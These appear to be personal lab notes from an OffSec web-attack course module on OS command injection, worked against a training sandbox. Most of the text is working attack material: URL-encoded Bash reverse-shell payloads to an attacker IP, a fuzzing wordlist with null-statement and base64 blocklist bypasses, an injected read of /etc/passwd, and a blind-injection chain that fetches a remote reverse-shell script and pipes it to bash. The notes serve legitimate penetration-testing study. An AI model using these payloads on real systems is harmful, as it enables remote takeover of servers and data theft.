This Learning Unit covers the following Learning Objectives:

1. Understand what we mean by Input Normalization.
2. Understand typical means of Input Sanitization and how we can bypass them.
3. Understand what Blind OS Command Injection is and how we can work with it.

In the following sections, we will discuss input normalization and sanitization. These techniques will help us deliver an accurate payload in a variety of scenarios.

Before we move on to bypassing typical input sanitization through blocklisted strings, we'll talk about normalization and sending payloads in a clean fashion.

#### 11.2.1. Typical Input Normalization - Sending Clean Payloads
Web applications often perform _input normalization_ on user-supplied data, processing it and manipulating it in a way that could adversely affect our command injection payload.

Our payload travels a sometimes-tricky path before it is processed by the target operating system. It begins in our browser or script, is processed by the target web server, then by the target web app (which often performs normalization and sanitization), and it may be passed to the operating system through a system function where it is executed. Each of these steps will process and may alter our payload and negatively affect the outcome. In the following sections, we will discuss some techniques we can use to ensure our payload is executed correctly, even as it passes through these various processes. Specifically, we will discuss bad character replacement, character escapes, _URL encoding_,[1](https://portal.offsec.com/courses/web-200-28380/learning/command-injection-35143/dealing-with-common-protections-35191/typical-input-normalization-sending-clean-payloads-35153#fn-local_id_254-1) and payload wrapping.

After getting system-level command execution, we make it a priority to obtain a reverse shell to gain control of our target through a terminal interface.

As we begin preparing our payload, we should consider "bad" characters, which have an assigned meaning along the payload's path. These characters could negate our payload.

Bad characters can often be mitigated by wrapping commands with bash -c '[COMMAND]' as the single apostrophes will inform the target server that "this counts as valid parameter data", rather than interpreting it as a new parameter entirely.

Let's demonstrate this with an example.

Before we begin, let's set up a _Netcat_ listener (nc) to catch a Bash reverse shell on port 9090.

We'll listen (bind) to the 0.0.0.0 interface (-l), request verbose output (-v), print numerical IP addresses and ports in all output (-n), and bind to port 9090 (-p 9090). Let's combine these arguments and run our listener.

```bash
kali@kali:~$ nc -nlvp 9090
listening on [any] 9090 ...
```

Now that we have our Netcat listener established, let's consider a sample payload.

```bash
http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|bash -c 'bash -i >& /dev/tcp/192.168.189.101/9090 0>&1'

http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.45.222/9090+0%3E%261%27
```

Above, we have highlighted the bad ampersand (&) characters. These characters act as delimiters to the back-end web technology. When the payload is sent and processed, the web server will interpret everything after the ampersand as an expected parameter/value combination. This will break our payload. To have these characters interpreted in a way that results in code execution will require URL encoding and normalization.

To encode our payload, we can use Burp Suite's "URL Encode Key Characters" feature. We load our request into Burp Suite and inside the _Repeater_ tab, select our payload (the selected text will end up being URL Encoded). Next, we'll right-click the request and select _Convert Selection_ > _URL_ > _URL Encode Key Characters_.

![[Pasted image 20241030145841.png]]
Our payload is now URL-encoded and the request is ready to be sent.

```bash
bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.222/9090+0>%261'
```
Encoding is an essential factor in any web payload delivery. To ensure that the target web server (such as _Apache_ or _Nginx_) correctly interprets various characters and does not invoke truncation or interpret two things as separate statements, we URL encode our payload to ensure successful delivery.

Now, let's inject our payload into the Node.js Command Injection Sandbox with curl.

```bash
curl "http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.222/9090+0>%261'"
```

Let's return to our Netcat listener.

By sending the wrapped and URL-encoded payload, we have received a root-privileged reverse shell!

Normalizing our payloads and making sure they are clean before being sent is an important skill to develop and re-implement when sending future requests. It will help us understand with absolute certainty that if our payload does not work due to suspected input normalization, it is not because of any bad characters or lack of URL encoding.

![[Pasted image 20241030150541.png]]

In the next section, we will discuss some typical methods of bypass for input sanitization.

-------------

#### 11.2.2. Typical Input Sanitization - Blocklisted Strings Bypass

Our next scenario is going to be a bit of a road block. If we try what we've learned so far in this Learning Module, we will not succeed. The endpoints we'll work with here implement common sanitization techniques that developers often implement to prevent command injection.

Let's jump in and demonstrate how our typical command injection attempts fail. If we attempt to inject the _whoami_ command at the `http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1;whoami` endpoint, it fails as indicated by the verbose error message "ip Parameter is Empty or Contains Blocklisted Strings".

![[Pasted image 20241030151551.png]]

We're going to need a better idea of what is limiting us from obtaining code execution, which brings us to the core idea of this section.

A Null Statement Injection Bypass can be inserted between any characters of our choosing.

***This technique also works for more complex payloads like "`nc -nlvp 9090", which becomes: n$()c -n$()lvp 9090`***

Let's try this out on our Kali VM. We can insert the _$()_ null statement in-between the "h" and the "o" characters.

```bash
kali@kali:~$ wh$()oami
kali
```

Cool! We provided special characters as a "statement". Linux then evaluated the statement as NULL and proceeded to execute whoami. This is the premise behind blocklisted string bypasses.

Let's try to run whoami on the web application by visiting the `http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1;wh$()oami` endpoint.

![[Pasted image 20241030151747.png]]

After sending our request with the null statement in _whoami_, our result (www-data) is returned to us at the end of the output.

At this point, we'll be more effective in our testing by using _Wfuzz_ in combination with a custom wordlist to triage the parameter with the null statement technique.

Our wordlist will check for various combinations of the special characters we have discussed in this Learning Module. We'll keep this wordlist small so we can carefully examine our Wfuzz output, particularly the response length. The last thing we want is to use a wordlist with thousands of lines (and requests) that result in nothing but erroneous responses and send unnecessary traffic to the target web server.

We'll create the following wordlist as `command_injection_custom.txt` and place it in our home directory.

#### Payloads
```bash
bogus
;id
|id
`id`
i$()d
;i$()d
|i$()d
FAIL||i$()d
&&id
&id
FAIL_INTENT|id
FAIL_INTENT||id
`sleep 5`
`sleep 10`
`id`
$(sleep 5)
$(sleep 10)
$(id)
;`echo 'aWQK' |base64 -d`
FAIL_INTENT|`echo 'aWQK' |base64 -d`
FAIL_INTENT||`echo 'aWQK' |base64 -d`
```

Our list includes an additional "bogus" string so we can guarantee a failed response length when fuzzing, or at least gain an interesting response, which we could render in our browser.

This is important because having a known response size when fuzzing a target endpoint is exceptionally useful when we're filtering our results for _successful_ attempts (or verbose error messages at the very least).

Now we're ready to launch our automated attack against our target endpoint. As a refresher, the endpoint we manually targeted earlier was: `http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1;wh$()oami`

We'll replace our injected whoami command with the "FUZZ" keyword, which leaves us with: `http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1FUZZ`

We'll call wfuzz with a few parameters. The first (-c) tells wfuzz that we would like color in our output. The next parameter (-z file,), instructs wfuzz to use a file as a payload list input source. We then specify a full absolute path to the wordlist. Next, we would like to exclude any "not found" responses as they are erroneous. To do this, we provide the --hc parameter a value of 404. Lastly, we have the complete endpoint with the "FUZZ" keyword included.

```bash
kali@kali:~$ wfuzz -c -z file,/home/kali/SUT/OSWA/command_injection_custom.txt --hc 404 http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1FUZZ
Total requests: 21

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000003:   200        68 L     124 W      1156 Ch     "|id"
000000015:   200        68 L     124 W      1156 Ch     "`id`"
000000018:   200        68 L     124 W      1156 Ch     "$(id)"
000000001:   200        68 L     117 W      1113 Ch     "bogus"
000000012:   200        68 L     124 W      1156 Ch     "FAIL_INTENT||id"
000000011:   200        68 L     124 W      1156 Ch     "FAIL_INTENT|id"
000000008:   200        69 L     120 W      1167 Ch     "FAIL||i$()d"
000000005:   200        68 L     117 W      1113 Ch     "i$()d"
000000002:   200        68 L     124 W      1156 Ch     ";id"
000000017:   200        68 L     124 W      1156 Ch     "$(sleep 10)"
000000014:   200        68 L     124 W      1156 Ch     "`sleep 10`"
000000004:   200        68 L     124 W      1156 Ch     "`id`"
000000020:   200        69 L     120 W      1167 Ch     "FAIL_INTENT|`echo 'aWQK' |base64 -d`"
000000021:   200        69 L     120 W      1167 Ch     "FAIL_INTENT||`echo 'aWQK' |base64 -d`"
000000016:   200        68 L     124 W      1156 Ch     "$(sleep 5)"
000000013:   200        68 L     124 W      1156 Ch     "`sleep 5`"
000000007:   200        69 L     120 W      1167 Ch     "|i$()d"
000000019:   200        79 L     187 W      1647 Ch     ";`echo 'aWQK' |base64 -d`"
000000009:   200        78 L     184 W      1593 Ch     "&&id"
000000006:   200        79 L     187 W      1647 Ch     ";i$()d"
000000010:   200        78 L     184 W      1593 Ch     "&id"

Total time: 0
Processed Requests: 21
Filtered Requests: 0
Requests/sec.: 0
```

We have a _lot_ of failed attempts that give us a response length of 1156 bytes. Let's hide these requests by providing wfuzz with the parameter-value combination of `--hh 1156`.

```bash
kali@kali:~$ wfuzz -c -z file,/home/kali/SUT/OSWA/command_injection_custom.txt --hc 404 --hh 1156 http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1FUZZ
Total requests: 21

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                 
=====================================================================
000000001:   200        68 L     117 W      1113 Ch     "bogus"                                       
000000005:   200        68 L     117 W      1113 Ch     "i$()d"                                 
000000008:   200        69 L     120 W      1167 Ch     "FAIL||i$()d"        
000000020:   200        69 L     120 W      1167 Ch     "FAIL_INTENT|`echo 'aWQK' |base64 -d`"       
000000021:   200        69 L     120 W      1167 Ch     "FAIL_INTENT||`echo 'aWQK' |base64 -d`"
000000010:   200        78 L     184 W      1593 Ch     "&id"                                        
000000009:   200        78 L     184 W      1593 Ch     "&&id"                                      
000000007:   200        69 L     120 W      1167 Ch     "|i$()d"                                      
000000006:   200        79 L     187 W      1647 Ch     ";i$()d"                  
000000019:   200        79 L     187 W      1647 Ch     ";`echo 'aWQK' |base64 -d`"

Total time: 0
Processed Requests: 21
Filtered Requests: 11
Requests/sec.: 0
```

Nice! The length of 1167 bytes seems promising. After suppressing a known "fail size" or "bogus" response, 1167 bytes seems to be the most common occurrence in our output. We're left with a few that we could attempt separately within our Web Browser.

Let's load the payload of `"|i$()d"` from our Wfuzz output into our browser and note the response.

```bash
http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1|i$()d
```
![[Pasted image 20241030152621.png]]

Great! We have code execution and managed to bypass those blocklisted strings.

Before we conclude, let's examine one other possible attack vector to bypass blocklisted strings entirely if a backtick (`) character is permitted. This can be achieved by using _base64 encoding_.[1](https://portal.offsec.com/courses/web-200-28380/learning/command-injection-35143/dealing-with-common-protections-35191/typical-input-sanitization-blocklisted-strings-bypass-35151#fn-local_id_268-1)

All we need to do is choose the payload we want, and echo it into the base64 binary on our attacking Kali Linux VM.

```bash
kali@kali:~$ echo "cat /etc/passwd" |base64
Y2F0IC9ldGMvcGFzc3dkCg==
```
Now that we have our base64-encoded payload, we begin our injection attempt with a semicolon and everything after is wrapped by backticks, which will also be piped and echoed to base64 -d, which in-turn executes _whatever is decoded_. This yields the following payload:

Initial Payload
```bash
;`echo "Y2F0IC9ldGMvcGFzc3dkCg=="|base64 -d`
```
After input into URL
```bash
http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22|base64%20-d`
```
![[Pasted image 20241030152847.png]]
Great! Our base64 method has effectively mitigated any blocklisted strings sanitization.

In the next section, we will discuss how to work with scenarios where we can not visually observe the output of our command injection attempts (otherwise known as _blind_ OS command injection).


#### Labs
1.
![[Pasted image 20241030153355.png]]

```bash
# Encode a file to Base64
openssl base64 -in inputfile -out outputfile

# Decode a Base64 encoded file
openssl base64 -d -in encodedfile -out decodedfile
```


2.
![[Pasted image 20241030173638.png]]
`OS{blocklisted_exercise_flag}`
```bash
http://ci-sandbox/php/blocklisted_exercise.php?ip=127.0.0.1
```
![[Pasted image 20241030153617.png]]
wfuzz the parameter
#webfuzzing 
```bash
┌──(root💀gobots)-[30Oct2024 19:23:09]-[/home/kali/SUT/OSWA]
└─# wfuzz -c -z file,/home/kali/SUT/OSWA/command_injection_custom.txt --hc 404 --hh 1156 http://ci-sandbox:80/php/blocklisted_exercise.php?ip=127.0.0.1FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://ci-sandbox:80/php/blocklisted_exercise.php?ip=127.0.0.1FUZZ
Total requests: 22

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                   
=====================================================================

000000006:   200        68 L     121 W      1175 Ch     "i$()d"                                                                                         
000000005:   200        68 L     121 W      1175 Ch     "`id`"                                                                                          
000000002:   200        68 L     117 W      1113 Ch     "gus"                                                                                           
000000016:   200        68 L     121 W      1175 Ch     "`id`"                                                                                          
000000019:   200        68 L     121 W      1175 Ch     "$(id)"                                                                                         
000000011:   200        75 L     160 W      1421 Ch     "&id"                                                                                           
000000001:   200        75 L     160 W      1421 Ch     "http://ci-sandbox:80/php/blocklisted_exercise.php?ip=127.0.0.1"                                
000000010:   200        75 L     160 W      1422 Ch     "&&id"                                                                                          
000000017:   200        75 L     164 W      1483 Ch     "$(sleep 5)"                                                                                    
000000014:   200        75 L     164 W      1483 Ch     "`sleep 5`"
000000015:   200        75 L     164 W      1483 Ch     "`sleep 10`"                                                                                    
000000018:   200        75 L     164 W      1486 Ch     "$(sleep 10)"                                                                                                                             

Total time: 0
Processed Requests: 22
Filtered Requests: 10
Requests/sec.: 0
```
send a curl to test sleep
```bash
http://ci-sandbox/php/blocklisted_exercise.php?ip=127.0.0.1$(sleep%205)
http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1$(sleep%205)
```
profit
![[Pasted image 20241030173535.png]]

#### 11.2.3. Blind OS Command Injection Bypass

Let's now continue into what _Blind OS Command Injection_. With blind OS command injection,[1](https://portal.offsec.com/courses/web-200-28380/learning/command-injection-35143/dealing-with-common-protections-35191/blind-os-command-injection-bypass-35148#fn-local_id_539-1) we will not receive immediate output confirming that our execution has succeeded.

Let's discuss ways of confirming that our command ran successfully when the application doesn't return any output from our injected command.

One way to do this is with a _sleep_ command. We can tell the target web server to sleep for an interval of time (say five seconds) and if we notice that after five seconds, the regular page content renders, then we have successfully identified that something is happening, and a blind command injection could be taking place. This means that any chained or extended commands would work even without observing their output.

Let's try out a blind command injection vulnerability in our sandbox application by attempting to run the id command.

```bash
http://ci-sandbox:80/php/blind.php?ip=127.0.0.1;id
```

Submitting our request in the browser returns the following page.

![[Pasted image 20241030181833.png]]

The web page content displays that the "Host is UP!". However, it would seem that there is no output from our _id_ command.
It is unclear if our command ran. Let's determine if this is a blind injection vector.
To set a benchmark, we will use time to measure how long our curl request takes against a server we know is down:

```bash
kali@kali:~$ time curl http://ci-sandbox:80/php/blind.php?ip=127.0.0.1
<html>
<head>
<link rel="stylesheet" href="../css/bootstrap.min.css">
<style type="text/css">
body{
  background-color: #121212;
}
.check{
  background-color: #1f1f1f;
  border-radius: 4px;
  padding-top: 34px;
  width: 600px;
  height: 150px;
  align-self: center;
  box-shadow: 5px 5px 5px #0f0f0f;
}
.online{
  color: #00ff4c;
}

.offline{
  color: #ff0000;
}

.noParam{
  color: #FFFFFF;
}

</style>
</head>
<body>


<center>
<div class="check" align="center">
        <pre>
        <h3 class='offline'>[ - ] Host is DOWN </h3>        </pre>
</div>
  <img src="logo.png"/>
</center>

</body>
</html>

real    0.11s
```

According to the output, this took `.11s`. This time may vary between virtual environments.
Next, let's inject a twenty-second _sleep_ command to attempt to pause the request's execution. If the request pauses, we may have a blind injection vector.

```bash
┌──(root💀gobots)-[30Oct2024 22:22:50]-[/home/kali/SUT/OSWA]                                                                                           
└─# time curl "http://ci-sandbox:80/php/blind.php?ip=127.0.0.1;sleep%2020" 
<html>
<head>
<link rel="stylesheet" href="../css/bootstrap.min.css">
<style type="text/css">
body{
  background-color: #121212;
}
.check{
  background-color: #1f1f1f;
  border-radius: 4px;
  padding-top: 34px;
  width: 600px;
  height: 150px;
  align-self: center;
  box-shadow: 5px 5px 5px #0f0f0f;
}
.online{
  color: #00ff4c;
}

.offline{
  color: #ff0000;
}

.noParam{
  color: #FFFFFF;
}

</style>
</head>
<body>


<center>
<div class="check" align="center">
        <pre>
        <h3 class='offline'>[ - ] Host is DOWN </h3>        </pre>
</div>
  <img src="logo.png"/>
</center>

</body>
</html>

real    20.11s
```

----------
#### 11.2.4 Extra Mile 

##### Labs
1.
Command making sure that command execution works with the sleep command
```bash
┌──(root💀gobots)-[30Oct2024 23:29:02]-[/home/kali/SUT/OSWA]                                                                                           
└─# time curl "http://ci-sandbox:80/php/blind_exercise.php?ip=127.0.0.1;sleep%2020"
```

![[Pasted image 20241030193156.png]]
created a revshell - was unable to have a one liner reverse shell
```bash
┌──(root💀gobots)-[30Oct2024 23:45:55]-[/home/kali/SUT/OSWA]
└─# cat revshell            
bash -i >& /dev/tcp/192.168.45.222/4444 0>&1
```
opened python3 server
```bash
┌──(root💀gobots)-[30Oct2024 23:47:43]-[/home/kali/SUT/OSWA]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.189.101 - - [30/Oct/2024 23:48:33] "GET /revshell HTTP/1.1" 200 -

```
opened up netcat listener
```bash
┌──(root💀gobots)-[30Oct2024 23:46:04]-[/home/kali]                                                                                                    
└─# nc -nlvp 4444                                                                                                                                       
listening on [any] 4444 ...     
```
curl reverse shell one liner
- utilizes `sleep 20` to get command execution
- `curl` to pull over the reverse shell
-  `bash` to execute the file
```bash
┌──(root💀gobots)-[30Oct2024 23:47:33]-[/home/kali/SUT/OSWA]
└─# time curl "http://ci-sandbox:80/php/blind_exercise.php?ip=127.0.0.1;sleep%2020;bash%20-c%20'curl%20http://192.168.45.222/revshell%20|%20bash'"
```
caught reverse shell
![[Pasted image 20241030211807.png]]
flag
![[Pasted image 20241030211822.png]]